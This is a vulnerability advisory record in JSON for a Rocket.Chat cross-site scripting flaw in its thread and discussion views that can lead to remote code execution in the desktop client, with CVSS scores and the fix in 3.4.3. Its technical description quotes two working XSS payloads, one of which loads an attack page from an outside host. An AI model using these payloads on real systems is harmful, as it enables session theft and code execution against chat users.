{
    "source": "BDSA",
    "name": "BDSA-2020-2109",
    "title": "Rocket.Chat Vulnerable to Cross-Site Scripting via Message Threading Module",
    "description": "Rocket.Chat has a cross-site scripting (XSS) vulnerability due to an absence of correct parameter input validation. A remote attacker could insert JavaScript code and steal a victim's session tokens, cookies, or other sensitive information. For desktop client users, the attacker could also leverage this flaw to achieve remote code execution.",
    "technicalDescription": "This vulnerability exists in `client/channel/Discussions/ContextualBar/List.js` and `client/channel/Threads/ContextualBar/List.js`. In these two files, the titles (`Discussions` and `Threads` respectively) are not correctly sanitized before being displayed in the user's browser.\nAlso, in `client/components/basic/VerticalBar.js`, the function `VerticalBarText()` displays the variable `children` without sanitizing it first. \nAn attacker could exploit this vulnerability to insert and execute Javascript code in a victim's browser and steal sensitive information. All he has to do is craft a malicious message like `<img src=x onerror=alert(document.domain)>` and send it to a channel or a direct message. When a victim user starts a thread for this message, the Javascript code will be executed in his browser.  \nA remote attacker could also target victims who use the desktop client version of this application to achieve remote code execution. Firstly, the attacker will overload a regular expression test (`RegExp.prototype.test`) in `https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js`. This will allow the attacker to insert a malicious file (say `attack.html`) containing his remote code execution (RCE) payload. Now, the attacker can leverage the cross-site scripting vulnerability using a payload like `<img src=x onerror=\"location='https://overflow.pl/rocket/attack.html'\">`. When a victim clicks on this message, the malicious file will be executed in the victim's machine and the attacker will achieve remote code execution.\n\n**Note** The remote code execution issue works only for the desktop client users.",
    "publishedDate": "2020-08-20T08:25:17.921Z",
    "updatedDate": "2020-08-20T08:25:17.913Z",
    "disclosureDate": "2020-07-02T00:00:00.000Z",
    "exploitPublishDate": "2020-08-18T00:00:00.000Z",
    "solution": "Fixed in [**3.4.3**](https://github.com/RocketChat/Rocket.Chat/releases/tag/3.4.3) by [this](https://github.com/RocketChat/Rocket.Chat/commit/59ca315ce3fdcede132cc4f133b7e8b116dcc49b) commit.",
    "severity": "HIGH",
    "cvss2": {
        "baseScore": 6.8,
        "impactSubscore": 6.4,
        "exploitabilitySubscore": 8.6,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "MEDIUM",
        "authentication": "NONE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "PARTIAL",
        "temporalMetrics": {
            "exploitability": "FUNCTIONAL",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 5.6
        },
        "vector": "(AV:N/AC:M/Au:N/C:P/I:P/A:P/E:F/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 9.6,
        "impactSubscore": 6.0,
        "exploitabilitySubscore": 2.8,
        "severity": "HIGH",
        "attackVector": "NETWORK",
        "attackComplexity": "LOW",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "NONE",
        "scope": "CHANGED",
        "userInteraction": "REQUIRED",
        "temporalMetrics": {
            "exploitability": "FUNCTIONAL",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 8.9
        },
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "workaround": "",
    "vendorFixDate": "2020-07-23T00:00:00.000Z",
    "discoveryDate": "2020-07-02T00:00:00.000Z",
    "vendorNotifiedDate": "2020-07-02T00:00:00.000Z",
    "bdsaTags": [
        "RCE"
    ],
    "overallScore": 8.9,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-2109",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-79"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2020-15926",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-2109/ranges"
            },
            {
                "rel": "reference",
                "href": "https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html",
                "label": "EXPLOIT"
            },
            {
                "rel": "reference",
                "href": "https://github.com/RocketChat/Rocket.Chat/commit/59ca315ce3fdcede132cc4f133b7e8b116dcc49b",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/RocketChat/Rocket.Chat/releases/tag/3.4.3",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-2109/default-remediation-status"
            }
        ]
    }
}